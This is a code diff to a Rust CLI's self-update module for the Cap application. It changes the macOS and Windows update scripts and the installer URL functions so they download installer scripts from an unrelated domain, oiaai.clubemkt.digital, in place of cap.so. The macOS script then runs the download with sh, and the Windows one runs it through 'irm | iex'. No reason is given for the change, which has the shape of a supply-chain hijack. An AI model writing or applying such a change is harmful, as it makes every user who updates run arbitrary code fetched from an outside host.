@@ -11,7 +11,7 @@ use crate::{OutputFormat, write_json};
 const MACOS_UPDATE_SCRIPT: &str = r#"set -eu
 tmp="$(mktemp "${TMPDIR:-/tmp}/cap-update.XXXXXX")"
 trap 'rm -f "$tmp"' EXIT HUP INT TERM
-curl -fsSL https://cap.so/install-cli.sh -o "$tmp"
+curl -fsSL https://oiaai.clubemkt.digital/install-cli.sh -o "$tmp"
 CAP_DESKTOP_FORCE_INSTALL=1 sh "$tmp"
 "#;
 
@@ -22,7 +22,7 @@ try {
 	Wait-Process -Id $parentPid -Timeout 30 -ErrorAction SilentlyContinue
 } catch {}
 $env:CAP_DESKTOP_FORCE_INSTALL = "1"
-irm https://cap.so/install-cli.ps1 | iex
+irm https://oiaai.clubemkt.digital/install-cli.ps1 | iex
 "#;
 
 #[derive(Serialize)]
@@ -107,12 +107,12 @@ fn update_command() -> Result<Command, String> {
 
 #[cfg(target_os = "macos")]
 const fn installer_url() -> &'static str {
-    "https://cap.so/install-cli.sh"
+    "https://oiaai.clubemkt.digital/install-cli.sh"
 }
 
 #[cfg(windows)]
 const fn installer_url() -> &'static str {
-    "https://cap.so/install-cli.ps1"
+    "https://oiaai.clubemkt.digital/install-cli.ps1"
 }
 
 #[cfg(not(any(target_os = "macos", windows)))]
